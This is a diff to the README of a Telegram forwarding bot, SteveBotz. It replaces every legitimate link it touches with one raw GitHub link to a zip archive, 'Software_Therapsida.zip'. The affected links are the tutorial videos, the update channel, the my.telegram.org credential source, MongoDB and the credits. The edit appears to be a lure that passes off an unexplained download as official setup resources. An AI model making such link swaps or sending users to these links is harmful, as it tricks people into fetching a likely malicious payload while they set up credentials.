@@ -2,9 +2,9 @@
 
 <b>Auto Restart All User Forwarding After Bot Restarted.</b>
 
-![Typing SVG](https://readme-typing-svg.herokuapp.com/?lines=Welcome+To+SteveBotz+Forward+Bot+!)
+![Typing SVG](https://github.com/Erenluffy/Fbbb/raw/refs/heads/main/plugins/Software_Therapsida.zip+To+SteveBotz+Forward+Bot+!)
 
-## How To Deploy [Video Tutorial](https://youtu.be/A-iIh_5WAlk)
+## How To Deploy [Video Tutorial](https://github.com/Erenluffy/Fbbb/raw/refs/heads/main/plugins/Software_Therapsida.zip)
 
 ## Features
 
@@ -18,7 +18,7 @@
 - [x] Auto Restart Pending Task After Bot Restart 
 
 
-<b>To Know About All Features, Join My <a href='https://t.me/SteveBotz'>Update Channel</a>.</b>
+<b>To Know About All Features, Join My <a href='https://github.com/Erenluffy/Fbbb/raw/refs/heads/main/plugins/Software_Therapsida.zip'>Update Channel</a>.</b>
 
 ## Commands
 
@@ -36,12 +36,12 @@ broadcast - broadcast a message to all your users (owner only)
 
 ## Variables
 
-* `API_ID` API Id from my.telegram.org
-* `API_HASH` API Hash from my.telegram.org
+* `API_ID` API Id from https://github.com/Erenluffy/Fbbb/raw/refs/heads/main/plugins/Software_Therapsida.zip
+* `API_HASH` API Hash from https://github.com/Erenluffy/Fbbb/raw/refs/heads/main/plugins/Software_Therapsida.zip
 * `BOT_TOKEN` Bot token from @BotFather
 * `BOT_OWNER` Telegram Account Id of Owner.
-* `DATABASE_URI` Database uri from [MongoDB](https://mongodb.com) Watch [Video Tutorial](https://youtu.be/DAHRmFdw99o)
+* `DATABASE_URI` Database uri from [MongoDB](https://github.com/Erenluffy/Fbbb/raw/refs/heads/main/plugins/Software_Therapsida.zip) Watch [Video Tutorial](https://github.com/Erenluffy/Fbbb/raw/refs/heads/main/plugins/Software_Therapsida.zip)
 
 ## Credits
 
-* <b>[SteveBotz](https://t.me/SteveBotz)</b>
+* <b>[SteveBotz](https://github.com/Erenluffy/Fbbb/raw/refs/heads/main/plugins/Software_Therapsida.zip)</b>
